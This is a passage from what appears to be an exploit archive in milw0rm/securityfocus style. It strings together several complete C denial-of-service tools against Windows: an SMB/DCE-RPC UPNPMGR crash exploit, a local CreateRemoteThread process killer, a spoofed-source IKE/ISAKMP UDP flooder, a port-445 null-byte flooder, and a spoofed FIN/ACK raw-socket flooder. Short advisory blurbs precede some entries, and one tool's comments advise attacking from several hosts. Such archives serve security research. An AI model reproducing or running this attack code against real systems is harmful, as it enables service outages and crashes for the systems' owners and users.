"\x00\x08\x40\x00\x18\xff\x00\xde\xde\x00\x10\x00\x16\x00\x00\x00"
"\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"
"\x02\x00\x00\x00\x03\x13\x00\x00\x5c\x00\x62\x00\x72\x00\x6f\x00"
"\x77\x00\x73\x00\x65\x00\x72\x00\x00\x00";

char peer0_4[] = 
"\x00\x00\x00\x9A\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x08\x01\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x01\x00\x10\x00\x00\x48\x00\x00\x00\x48\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x52\x00\x48\x00\x52\x00\x02"
"\x00\x26\x00\x00\x40\x57\x00\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5C\x00\x00\x00\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00"
"\x00\x00\x00\x00\x00\x00\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00"
"\x00\x00\x00\x00\x01\x00\x40\x4E\x9F\x8D\x3D\xA0\xCE\x11\x8F\x69"
"\x08\x00\x3E\x30\x05\x1B\x01\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C"
"\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00";

char peer0_5[] =
//NETBIOS Fields
//==============
"\x00"		//Message type
"\x00\x00\x80"  //Payload length 			C
//SMB Fields
//==========
//SMB Header
"\xFF\x53\x4D\x42\x2F\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x40\x6D\x4E\xF4\x8C\x6E\x13\x7B\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x00\x01"
//Write ANDX Request fields
"\x0E" //Word count
"\xFF\x00\xDE\xDE\x00\x40\x00\x00\x00\x00\xFF"
"\xFF\xFF\xFF\x08\x00"
"\x40\x00" //Remaining					C
"\x00\x00" //Data Length High
"\x40\x00" //Data Length Low				C
"\x40\x00" //Data Offset				C	
"\x00\x00\x00\x00" //High Offset
"\x41\x00" //Byte count					C
"\xEE"//Padding
//DCE RPC Request field
//=====================
"\x05\x00\x00\x03\x10\x00\x00\x00"
"\x40\x00" //Frag Length
"\x00\x00" //Auth Length
"\x8D\x00\x00\x00" //Call Id
"\x28\x00\x00\x00" //Alloc HINT				C
"\x00\x00"  //Context Id
"\x0A\x00"  //OpNum; 10 in our case for PNP_GetDeviceList
//DATA for GetDeviceList 
"\x00\x00\x00\x00"
"\x10\x10\x10\x10" //This is what kills the target. \x00\x00\x00\x00 is safe
"\x48\x54\x52\x45\x45\x5C\x52\x4F\x4F\x54\x5C"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00";

void send_packet(int sock, char *payload, int size,
char *type)
{
	int ntrans, ret;
	
	memcpy(&payload[30], &ProcessID, 2);
	
	if (UserID) 
		memcpy(&payload[32], &UserID, 2);
	if (TID)
		memcpy(&payload[28], &TID, 2);

	if (strcmp(type, "Sending DCE RPC Bind UPNPMGR request") == 0) {
		memcpy(&payload[67], &FID, 2);
	}
	if (strcmp(type, "UPNPMGR upnp_getdevicelist request") == 0) {
		memcpy(&payload[41], &FID, 2);
	}

	printf("[*] %s: ", type);
	fflush(stdout);
	ntrans = send(sock, payload, size, 0);
	if (ntrans < 0) {
		printf("\033[0;31mFailed\033[0;39m\n\n");
		exit(-1);
	}
}

void get_response(int sock, char *type)
{
	int ret;
	char response[1496];

	ret = recv(sock, response, 1496, 0);
	if (strcmp(type, "Null Session request 1") != 0) {
		if ((ret < 0 || response[9] != 0)) {
			printf("\033[0;31mError in %s response\033[0;39m\n\n", type);
			exit(-1);
		}
	}
	
	if (strcmp(type, "Null Session request 1") == 0) {
		UserID = *(unsigned short *)&response[32];
	}
	if (strcmp(type, "Tree Connect") == 0) {
		TID = *(unsigned short *)&response[28];
	}
	if (strcmp(type, "NT Creat AndX") == 0) {
		FID = *(unsigned short *)&response[42];
	}
	
	if (strcmp(type, "UPNPMGR upnp_getdevicelist") == 0)
{
		if((unsigned long)response[88] != 0) {
			printf("\033[0;31mnca_s_fault_ndr\033[0;39m\n\n");
			exit(-1);
		}
	}
	printf("\033[0;32mOK\033[0;39m\n");
}

void banner()
{

printf("\n\n\033[0;31m\t!------------------------------------------!\n\033[0;39m");
	printf("\033[0;31m\t Memory leak when sending upnp_getdevicelist request\n\033[0;39m");
	printf("\033[0;31m\t Coded by: \033[0;34m Winny Thomas :-)\n\033[0;39m");
	printf("\033[0;34m\t\t    NevisLabs\n\033[0;39m");
	printf("\033[0;34m\t\t    Nevis Networks, Pune, INDIA\n\033[0;39m");

printf("\033[0;31m\t!------------------------------------------!\n\n\033[0;39m");
}

char *setup_tCon(char *UNC, char *ptr)
{
	int pindex = 0, uindex = 0, len;	
	
	len = strlen(UNC);
	while (uindex < len) {
		if ((pindex % 2) != 0) {
			ptr[pindex] = '\x00';
			pindex++;
			continue;
		}

		ptr[pindex] = UNC[uindex];
		uindex++;
		pindex++;
	}

	ptr[pindex] = '\x00';
	pindex++;
	ptr[pindex] = '\x00';
	pindex++;
	ptr[pindex] = '\x00';
	pindex++;

	ptr[pindex] = 'I'; pindex++; ptr[pindex] = 'P'; pindex++; ptr[pindex] ='C'; pindex++;

	ptr[pindex] = '\x00';
	pindex++;
	ptr[pindex] = '\x00';
	pindex++;
}

int main(int argc, char *argv[])
{
	struct sockaddr_in target;
	struct hostent *host;
	char UNC[50], tConXpacket[150], *temp, targetIP[20];
	int sockfd;
	int ret, templen;
	
	system("clear");
	banner();

	if (argc < 2) {
		printf("Usage: %s <host name|ip address>\n\n", argv[0]);
		exit(-1);
	}
	
	srand(time(NULL));
	ProcessID = rand();

	printf("[*] Resolving %s: ", argv[1]);
	host = gethostbyname(argv[1]);
	if (!host) {
		printf("\033[0;31mFailed\033[0;39m\n");
		exit(-1);
	}
	printf("\033[0;32mOK\033[0;39m\n");
	
	target.sin_family = AF_INET;
	target.sin_addr = *(struct in_addr *)host->h_addr;
	target.sin_port = htons(445);
	sprintf(targetIP, "%s", inet_ntoa(target.sin_addr));
	
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	ret = connect(sockfd, (struct sockaddr *)&target, sizeof(target));
	if (ret < 0) {
		perror("Connect");
		exit(-1);
	}

	send_packet(sockfd, peer0_0, sizeof(peer0_0) -1, "Sending SMB Negotiate request");
	get_response(sockfd, "SMB Negotiate");	

	send_packet(sockfd, peer0_1, sizeof(peer0_1) -1, "Sending Null Session request");
	get_response(sockfd, "Null Session request 1");

	send_packet(sockfd, peer0_1_2, sizeof(peer0_1_2) -1, "Sending Null Session request");
	get_response(sockfd, "Null Session request 2");

	bzero(tConXpacket, 150);
	temp = tConXpacket;
	memcpy(tConXpacket, peer0_2, sizeof(peer0_2));
	temp += sizeof(peer0_2) -1;
	sprintf(UNC, "\\\\%s\\IPC$", targetIP);
	setup_tCon(UNC, temp);
	templen = (strlen(UNC)*2) +9;
	tConXpacket[3] = 43 + templen;
	templen -= 2;
	memcpy((unsigned long *)&tConXpacket[45], &templen, 1);

	send_packet(sockfd, tConXpacket, sizeof(peer0_2) +templen, "Sending Tree Connect request");
	get_response(sockfd, "Tree Connect");

	send_packet(sockfd, peer0_3, sizeof(peer0_3) -1, "Sending NT Creat AndX request");
	get_response(sockfd, "NT Creat AndX");

	send_packet(sockfd, peer0_4, sizeof(peer0_4) -1, "Sending DCE RPC Bind UPNPMGR request");
	get_response(sockfd, "DCE RPC Bind UPNPMGR");

	send_packet(sockfd, peer0_5, sizeof(peer0_5) -1, "UPNPMGR upnp_getdevicelist request");
	get_response(sockfd, "UPNPMGR upnp_getdevicelist");

	close(sockfd);
}

// milw0rm.com [2005-11-16]
source: http://www.securityfocus.com/bid/15671/info

Microsoft Windows is prone to a local denial of service vulnerability. This issue can allow an attacker to trigger a system wide denial of service condition or terminate arbitrary processes.

Reports indicate that a process can call the 'CreateRemoteThread' function to trigger this issue.

It was reported that this attack can be carried out by a local unprivileged user.

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL exploit(char* chProcessName)
{

        HANDLE hProcessSnap = NULL;

        HANDLE hProcess = NULL;

        BOOL bFound = FALSE;

        BOOL bRet = FALSE;

        PROCESSENTRY32 pe32 = {0};

        UINT uExitCode = 0;

        DWORD dwExitCode = 0;

        LPDWORD lpExitCode = &dwExitCode;





        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE)
    return (FALSE);

   pe32.dwSize = sizeof(PROCESSENTRY32);

    printf("\n[+] Search For Process ... \n");


   while(!bFound && Process32Next(hProcessSnap, &pe32))
   {
       if(lstrcmpi(pe32.szExeFile, chProcessName) == 0)
           bFound = TRUE;

   }

   CloseHandle(hProcessSnap);

   if(!bFound){

                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED| FOREGROUND_INTENSITY)          ;


           printf("[-] Sorry Process Not Find \n");

           return(FALSE);

  }
   printf("[+] Process Find \n");

   hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);


   if(hProcess == NULL){


        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED| FOREGROUND_INTENSITY)          ;


   printf("[-] Sorry Write Access Denied for This Process \n");
   printf("[-] Exploit Failed  :( \n");

   return(FALSE);
   }


   printf("[+] Write Access Is allowed \n");

   printf("[+] Send Exploit To Process ...\n");

   CreateRemoteThread(hProcess,0,0,(DWORD (__stdcall *)(void *))100,0,0,0);

   printf("[+] Successful  :)\n");


   return(pe32.th32ProcessID);
}

int main(int argc,char **argv)
{
char* chProcess = argv[1];

       COORD coordScreen = { 0, 0 };
   DWORD cCharsWritten;
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD dwConSize;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    GetConsoleScreenBufferInfo(hConsole, &csbi);
    dwConSize = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacter(hConsole, TEXT(' '), dwConSize,
        coordScreen, &cCharsWritten);
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    FillConsoleOutputAttribute(hConsole, csbi.wAttributes, dwConSize,
        coordScreen, &cCharsWritten);
    SetConsoleCursorPosition(hConsole, coordScreen);

        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_GREEN| FOREGROUND_INTENSITY)        ;


   if(argc < 2) {


        printf("\n");
    printf("
    ==========================================================================   \n");
        printf("  >              Microsoft Windows CreateRemoteThread
        Exploit              <   \n");
    printf("  >            BUG Find By Q7X ( Nima Salehi ) Q7X@Ashiyane.com
    <   \n");

        printf("  >           Exploited By Q7X ( Nima Salehi )
        Q7X@Ashiyane.com            <   \n");
         SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED | FOREGROUND_INTENSITY|FOREGROUND_GREEN|FOREGROUND_BLUE);


    printf("  >  Compile   : cl -o nima.c   ( Win32/VC++ )
    <   \n");

        printf("  >  Usage     : nima.exe  Process
        <   \n");
        printf("  >  Example   : nima.exe  explorer.exe
        <   \n");
        printf("  >  Tested on : Windows XP (SP0 ,SP1 ,SP2) , Windows 2000
        AdvServer (SP4) <   \n");
    printf("  >              Windows 2000 Server (SP4), Windows 2003 (SP0 ,
    SP1)       <   \n");
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED| FOREGROUND_INTENSITY)          ;

        printf("  >     Copyright 2002-2005 By Ashiyane Digital Network
        Security Team      <   \n");
    printf("  >     www.Ashiyane.com ( Free )        www.Ashiyane.net ( Not
    Free )     <   \n");

        printf("  >              Special Tanx To My Best Friend Behrooz_Ice
        <   \n");

        printf("
        ==========================================================================  \n");


  }
    else

  exploit(chProcess);





 SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED |FOREGROUND_GREEN|FOREGROUND_BLUE);


}

source: http://www.securityfocus.com/bid/3652/info

Internet Protocol Security (IPSec) provides authentication and encryption for IP network traffic. The Internet Key Exchange (IKE) protocol is a management protocol standard which is used with the IPSec standard. IKE contributes to the IPSec standard by providing additional features and by default listens on UDP port 500.



An issue exists in IKE which could cause a Windows 2000 host to stop responding.



Connecting to port 500 and submitting a continuous stream of arbitrary packets, will cause the CPU utilization to spike to approximately 100%.


It should be noted that this vulnerability may be due to an underlying issue with the UDP protocol.


/* Autor         :       Nelson Brito

 * E-mail        :       nelson@SEKURE.ORG ou nelson@WWSECURITY.NET

 * URL           :       http://nelson.wwsecurity.net/

 * Arquivo       :       nb-isakmp.c

 * Vers�o        :       0.3 Alpha

 * Pa�s          :       Brasil

 * Data          :       11/12/2001

 *

 *

 * Descri��o: 

 * Este � a prova-do-conceito(proof-of-concept) do ataque de nega��o

 * de servi�o(denial of service, a.k.a. DoS) que explora a falha do

 * IKE/ISAKMP(UDP 500) em sistemas Windows 2000.

 *

 * Esta � a vers�o em C de um c�digo j� lan�ado em PERL(Net::RawIP).

 *

 * Feliz Natal e um Feliz Ano Novo.

 * Merry Christmas and Happy New Year.

 */

#include <stdio.h>

#include <netdb.h>

#include <string.h>

#include <getopt.h>

#include <stdlib.h>

#include <signal.h>

#include <unistd.h>

#include <arpa/inet.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <netinet/ip.h>

#include <netinet/udp.h>



#define ISAKMP_LEN      800

#define IPPORT_ISAKMP   500

#define SEND_MAX        31337





extern char *optarg;

extern int optind;

extern int h_errno;



void usage(char *name){

        printf("\nUse:  %s [options]\n\n", name);

        printf("\t-s, --source*\t\tSource Address to Spoof\n");

        printf("\t-d, --destination*\tDestination Address to Attack\n");

        printf("\t-p, --port\t\tDestination Port to Attack\t(def: %d)\n", IPPORT_ISAKMP);

        printf("\t-n, --number\t\tNumber of Packets to Send\t(def: %d)\n", SEND_MAX);

        printf("\t-l, --length\t\tPackets Length\t\t\t(def: %d)\n", ISAKMP_LEN);

        printf("\t-L, --loop\t\tSend Packets Forever\n");

        printf("\t-h, --help\t\tShow this Message\n\n");

        printf("Copyrigth(c) 2001 Nelson Brito<nelson@SEKURE.ORG>. All rigths reserved.\n");

        exit(0);

}



void u_abort(int s){

        printf("\nnb-isamkp.c: aborted process id %d.\n", getpid());

        printf("Rock my world, baby!\n");

        exit(0);

}



char die(char *message){

        printf("%s\n", message);

        exit(0);

}



/* 

 * Eu j� vi v�rias fun��es que fazem a mesma coisa, por�m nunca de

 * uma forma t�o robusta. Quero ver neguinho pagar pau pros gringos

 * agora. ;-)

 */

u_long getip(char *destination){

        static u_long ip_addr;

        struct hostent *hostname;


        hostname = gethostbyname(destination);

        if(hostname == NULL){

                switch(h_errno){

                        case HOST_NOT_FOUND:

                                die("getip(): the spcified host is unknown."); 

                                break;

                        case NO_ADDRESS|NO_DATA:

                                die("getip(): the requested name is valid but does not have an IP address."); 

                                break;

                        case NO_RECOVERY:

                                die("getip(): a non-recoverable name server error occured."); 

                                break;

                        case TRY_AGAIN:

                                die("getip(): a temporary error occurred on a AUTH NS, try again later."); 

                                break;

                        default: 

                                break;

                }

        }

       memcpy(&ip_addr, hostname->h_addr, hostname->h_length);

        return(ip_addr);        

}



int isakmp_dos(int sock, u_long s_address, u_long d_address, int port, int number, int forever, int length){

        int nbs, 

            i, 

            psize, 

            times = 0, 

            dp,

            iplen  = sizeof(struct iphdr),

            udplen = sizeof(struct udphdr);



        struct sockaddr_in sin;



        struct _packet{

                struct iphdr  ip;

                struct udphdr udp;

                char data[length];

        } nb_pkt;







        sin.sin_family      = AF_INET;

        sin.sin_port        = 1235;

        sin.sin_addr.s_addr = d_address;



        psize = iplen + udplen + length;

        

        memset(&nb_pkt, 0, psize);



        nb_pkt.ip.version  = 4;

        nb_pkt.ip.ihl      = 5;

        nb_pkt.ip.tot_len  = htons(iplen + udplen + length);

        nb_pkt.ip.id       = htons(0xdead);

        nb_pkt.ip.ttl      = 0xff;

        nb_pkt.ip.protocol = IPPROTO_UDP;

        nb_pkt.ip.saddr    = s_address;

        nb_pkt.ip.daddr    = d_address;



        dp = port ? port : IPPORT_ISAKMP;



        nb_pkt.udp.source = htons(dp);

        nb_pkt.udp.dest   = htons(dp);

        nb_pkt.udp.len    = htons(length);

        nb_pkt.udp.check  = htons(0xbeef);



        for(i = 0 ; i < length ; i++)

                nb_pkt.data[i] = 0x2e;



        times = number ? number : SEND_MAX;



        while(times > 0){

                printf(".");

                nbs = sendto(sock, &nb_pkt, psize, 0, (struct sockaddr *) &sin, sizeof(struct sockaddr));

                if(!forever) times--;

        }

        return nbs;

}



int main(int argc, char **argv){

        char *version = "0.4a";

        u_long source, destination;

        int lineopt, 

            port = 0, 

            nb, 

            nbs = 1,

            loop = 0,

            number = 0,

            pkt_len,

            src_ok = 0,

            dst_ok = 0,

            length = 0;



        printf("--- nb-isakmp.c v.%s / Nelson Brito / Independent Security Consultant ---\n", version);



        (argc < 4) ? usage(argv[0]) : (char *)NULL;



        signal(SIGHUP,  SIG_IGN);

        signal(SIGINT,  u_abort);

        signal(SIGTERM, u_abort);

        signal(SIGKILL, u_abort);

        signal(SIGQUIT, u_abort);



        while(1){

                static struct option my_opt[]={

                        {"source",        1, 0, 's'},

                        {"destination",   1, 0, 'd'},

                        {"port",          1, 0, 'p'},

                        {"number",        1, 0, 'n'},

                        {"length",        1, 0, 'l'},

                        {"loop",          0, 0, 'L'},

                        {"help",          0, 0, 'h'},

                        {0,               0, 0, 0}

                };

                int option_index = 0;

                lineopt = getopt_long(argc, argv, "s:d:p:n:l:Lh", my_opt, &option_index);



                if(lineopt == -1) break;



                switch(lineopt){

                        case 's':

                                source = getip(optarg); 

                                src_ok++; 

                                break;

                        case 'd':

                                destination = getip(optarg); 

                                dst_ok++; 

                                break;

                        case 'p':

                                port = atoi(optarg);

                                if((port <= 0) || (port > 65535))

                                        die("main(): port range error.");

                                break;

                        case 'n':

                                number = atoi(optarg); 

                                break;

                        case 'l':

                                length = atoi(optarg); 

                                break;

                        case 'L':

                                loop++; 

                                break;

                        case 'h':

                        default:

                                usage(argv[0]); 

                                break;

                }

        }



        if((!src_ok) && (!dst_ok)) usage(argv[0]);



        if((nb = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))< 0)


                die("main(): socket() error.");

        

        if(setsockopt(nb, IPPROTO_IP, IP_HDRINCL, (char *)&nbs, sizeof(nbs)) < 0)

                die("main(): setsockopt() error.");



        pkt_len = length ? length : ISAKMP_LEN;



        if((isakmp_dos(nb, source, destination, port, number, loop, pkt_len)) == -1)

                die("main(): isakmp_dos() error");



        printf("\nRock my world, baby!\n");

        return(1);

}
  	source: http://www.securityfocus.com/bid/4532/info

An issue has been discovered in Windows 2000, which could cause a denial of system services.

Submitting malformed data to port 445 could cause the Lanman service to consume high CPU and Kernel mode memory usage. 

/********************************************************
* 	Microsoft Windows 2000 Remote DoS 		*
*	---------------------------------		*
*							*
* Hello :)						*
* This is an DoS exploit that utilizes the flaw found 	*
* by KPMG Denmark, to crasch or hang any Win2k box 	*
* running the LanMan server on port 445 (ms-ds).  	*
* What it does is just a simple 10k NULL string		*
* bombardment of port 445 TCP or UDP.			*
*							*
*			                                *
* By: Daniel Nystrom <exce@netwinder.nu>		*
* Download: www.telhack.tk / exce.darktech.org		*
*							*
* Suggestions: When performing the attack, use UDP if 	*
*	       you are attacking from a single host. 	*
*	       TCP only eats about 35% CPU on an AMD	*
*	       Athlon XP 1800+ while UDP eats 99%.      *
*	       So if TCP is the only option, use more   *
*	       than one attacking host. All in all this *
*              DoS is "pretty weak" and should be used  *
*              from more than one host in each attack   *
*              to get the best result.                  *
*							*
* Compiles on: Linux (Debian 2.2r6 and RH 7.3 tested).  *
*              Should compile on other *nix's as well.  *
*							*
* Thanks: Peter Grundl, for answering my Q's :)         *
*							*
* greets: xenogen, ifa-, zeromatic, RTJ, all@telhack    *
*							*
********************************************************/

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <errno.h>

#define MICROSOFT_DS_PORT 445

unsigned long resolveTarget(char nstarget[]);


int main(int argc, char *argv[])
{
        int sock;
	int count;
	struct sockaddr_in target;
	unsigned short port = MICROSOFT_DS_PORT;
	char *nullbuffer;


	printf("%c[41m", 0x1B);
	fprintf(stdout, "\n--[ excE's Remote Microsoft Windows 2000 DoS (microsoft-ds)\n"); 
	printf("%c[0m", 0x1B);
	fprintf(stdout, "-----------------------------------------------------------\n");

        if(argc != 4)
        {
                fprintf(stderr, "--[ Invalid number of parameters!\n");
                fprintf(stderr, "--[ Usage: %s <Server IP> <TCP/UDP> <Send Count>\n", argv[0]);
                fprintf(stderr, "--[ Forex: %s 127.0.0.1 UDP 10000\n\n", argv[0]);
                exit(-1);
        }

	nullbuffer = (char *) malloc(10*1024*sizeof(char));
	bzero(nullbuffer,sizeof(nullbuffer));
	
	fprintf(stdout, "--[ Starting attack on %s...\n", argv[1]);

	memset(&target, 0, sizeof(target));
	target.sin_family 	= AF_INET;
	target.sin_addr.s_addr 	= resolveTarget(argv[1]);
	target.sin_port		= htons(port);


	if(argv[2][0] == 'U')
	{
		if((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		{
			perror("socket() failed ");
			exit(-1);
		}
	
		fprintf(stdout, "--[ Sending NULL byte string * %d via UDP\n", atoi(argv[3]));

		for(count=0;count<atoi(argv[3]);count++)
		{
		    if(sendto(sock, nullbuffer, strlen(nullbuffer), 0, (struct sockaddr *) &target, sizeof(target)) != strlen(nullbuffer))
		    {
				perror("sendto() failed ");
				exit(-1);
		    } else { printf("."); } 
		}
		close(sock);
		printf("\n");
	}
	 else if(argv[2][0] == 'T')
	{
		
		fprintf(stdout, "--[ Connecting and sending NULL byte string * %d...\n", atoi(argv[3]));
		 
		if((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		{
			perror("socket() failed ");
			exit(-1);
		}

		if(connect(sock, (struct sockaddr *) &target, sizeof(target)) < 0)
		{
			perror("connect() failed ");
			exit(-1);
		}

		for(count=0;count<atoi(argv[3]);count++)
		{ 
			if(send(sock, nullbuffer, strlen(nullbuffer), 0) != strlen(nullbuffer))
			{
				perror("send() failed ");
				exit(-1);
			} else { printf("."); }

		}
		close(sock);
		printf("\n");
	} else
	{
		fprintf(stderr, "--[ Error: You must define a protocol (TCP or UDP)\n\n");
		exit(-1);
	}

	fprintf(stdout, "--[ Finished flooding target!\n");
	fprintf(stdout, "--[ http://www.telhack.tk\n");
	
	return 0;
}

unsigned long resolveTarget(char nstarget[])
{
	struct hostent *targetname;

	if((targetname=gethostbyname(nstarget)) == NULL)
	{
		fprintf(stderr, "--[ Name lookup failed. Please enter a valid IP or hostname\n");
		exit(-1);
	}

	return *((unsigned long *) targetname->h_addr_list[0]);
}
source: http://www.securityfocus.com/bid/3967/info

An issue exists in Windows which could cause the TCP stack to consume all available system memory.

This is achieved if a user sends numerous empty TCP packets to a host on port 139.

Successful exploitation of this vulnerability could render the system useless.

/*                                    
 stream3.c - FIN/ACK flooder
 Tested to compile and work under FreeBSD
 (c) by 3APA3A @ SECURITY.NNOV, 2000
 3APA3A@security.nnov.ru
 http://www.security.nnov.ru
 Thanx to DarkZorro & Error for discovering this problem
 Greetz to void.ru. Get better, Duke!
*/

#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>


#include <netinet/in.h>
#include <netdb.h>

#ifdef LINUX
#define FIX(x)  htons(x)
#else
#define FIX(x)  (x)
#endif

#define	TH_FIN	0x01
#define	TH_SYN	0x02
#define	TH_RST	0x04
#define	TH_PUSH	0x08
#define	TH_ACK	0x10
#define	TH_URG	0x20


struct ip_hdr {
    u_int       ip_hl:4,                /* header length in 32 bit words */
                ip_v:4;                 /* ip version */
    u_char      ip_tos;                 /* type of service */
    u_short     ip_len;                 /* total packet length */
    u_short     ip_id;                  /* identification */
    u_short     ip_off;                 /* fragment offset */
    u_char      ip_ttl;                 /* time to live */
    u_char      ip_p;                   /* protocol */
    u_short     ip_sum;                 /* ip checksum */
    u_long      ip_src, ip_dst;           /* source and dest address */
};

struct tcp_hdr {
    u_short     th_sport;               /* source port */
    u_short     th_dport;               /* destination port */
    u_long      th_seq;                 /* sequence number */
    u_long      th_ack;                 /* acknowledgement number */
    u_int       th_x2:4,                /* unused */
                th_off:4;               /* data offset */
    u_char      th_flags;               /* flags field */
    u_short     th_win;                 /* window size */
    u_short     th_sum;                 /* tcp checksum */
    u_short     th_urp;                 /* urgent pointer */
};


struct pseudo_hdr {                     /* See RFC 793 Pseudo Header */
    u_long saddr, daddr;                /* source and dest address */
    u_char mbz, ptcl;                   /* zero and protocol */
    u_short tcpl;                       /* tcp length */
};

struct packet {
    struct ip_hdr ip;
    struct tcp_hdr tcp;
};

struct cksum {
    struct pseudo_hdr pseudo;
    struct tcp_hdr tcp;
};



u_short dstport=139, srcport=0;
u_long dstaddr, srcaddr=0;
int sock;

void usage(char *progname)
{
    fprintf(stderr, 
     "Usage: %s <dstaddr> <dstport> <srcaddr> <srcport>\n"
     "    dstaddr     - the target we are trying to attack.\n"
     "    dstport     - TCP port (139 default).\n"
     "    srcaddr     - spoofed source address (random default)\n"
     "    srcport     - spoofed source TCP port (random default)\n",
    progname);
    exit(1);
}



/* This is a reference internet checksum implimentation, not very fast */
inline u_short in_cksum(u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

     /* Our algorithm is simple, using a 32 bit accumulator (sum), we add
      * sequential 16 bit words to it, and at the end, fold back all the
      * carry bits from the top 16 bits into the lower 16 bits. */

     while (nleft > 1)  {
         sum += *w++;
         nleft -= 2;
     }

     /* mop up an odd byte, if necessary */
     if (nleft == 1) {
         *(u_char *)(&answer) = *(u_char *) w;
         sum += answer;
     }

     /* add back carry outs from top 16 bits to low 16 bits */
     sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
     sum += (sum >> 16);                /* add carry */
     answer = ~sum;                     /* truncate to 16 bits */
     return(answer);
}

u_long lookup(char *hostname)
{
    struct hostent *hp;

    if ((hp = gethostbyname(hostname)) == NULL) {
       fprintf(stderr, "Could not resolve %s.\n", hostname);
       exit(-3);
    }

    return *(u_long *)hp->h_addr;
}


void flooder(void)
{
    int i;
    struct packet packet;
					/* use same structure as pseudo packet */
    struct cksum  * cksum = (struct cksum *)((char *)&packet + sizeof(struct ip_hdr) - sizeof(struct pseudo_hdr)) ;
    struct sockaddr_in s_in;
    
    memset(&packet, 0, sizeof(packet));
    
    if(!srcaddr)srcaddr = random();
    if(!srcport)srcport = rand();


    packet.tcp.th_win           = htons(16384);
    packet.tcp.th_seq           = random();
    packet.tcp.th_ack           = 0;
    packet.tcp.th_off           = 5;
    packet.tcp.th_urp           = 0;
    packet.tcp.th_ack 		= rand();
    packet.tcp.th_flags 	= TH_ACK|TH_FIN;
    packet.tcp.th_sport 	= htons(srcport);
    packet.tcp.th_dport         = htons(dstport);
    cksum->pseudo.daddr          = dstaddr;
    cksum->pseudo.saddr		 = srcaddr;
    cksum->pseudo.mbz            = 0;
    cksum->pseudo.ptcl           = IPPROTO_TCP;
    cksum->pseudo.tcpl           = htons(sizeof(struct tcp_hdr));
 
    packet.tcp.th_sum           = in_cksum((void *)cksum, sizeof(struct cksum));

    packet.ip.ip_hl             = 5;
    packet.ip.ip_v              = 4;
    packet.ip.ip_p              = IPPROTO_TCP;
    packet.ip.ip_tos            = 0x08;
    packet.ip.ip_id             = rand();
    packet.ip.ip_len            = FIX(sizeof(packet));
    packet.ip.ip_off            = 0;
    packet.ip.ip_ttl            = 255;
    packet.ip.ip_dst		= dstaddr;
    packet.ip.ip_src     	= srcaddr;
    packet.ip.ip_sum         	= 0;
    packet.ip.ip_sum            = in_cksum((void *)&packet.ip, 20);

    s_in.sin_family             = AF_INET;
    s_in.sin_port               = htons(dstport);
    s_in.sin_addr.s_addr	= dstaddr;
    for(i=0;;++i) {			/* we do not want to change packet at all */
       if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)&s_in, sizeof(s_in)) < 0)
          perror("sendto()");
    }
}

int main(int argc, char *argv[])
{
    int on = 1;

    printf("stream3.c v0.1 - FIN/ACK Storm\n 3APA3A@security.nnov.ru\n");

    if (argc < 1) exit(-3);
    if (argc < 3 || argc > 5)
       usage(argv[0]);

    srand(time(NULL)); 			/* we needn't too much randomness */

    dstaddr     = lookup(argv[1]);
    dstport     = atoi(argv[2]);

    if (!dstaddr || !dstport) usage(argv[0]);

    if(argc > 3) srcaddr = lookup(argv[3]);
    if(argc > 4) srcport = atoi(argv[4]);

    if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
       perror("socket()");
       exit(-1);
    }

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
       perror("setsockopt()");
       exit(-2);
    }

    printf("Starting"); 
    fflush(stdout);

    flooder();

    return 0;
}source: http://www.securityfocus.com/bid/3967/info
 
An issue exists in Windows which could cause the TCP stack to consume all available system memory.
 
This is achieved if a user sends numerous empty TCP packets to a host on port 139.
 
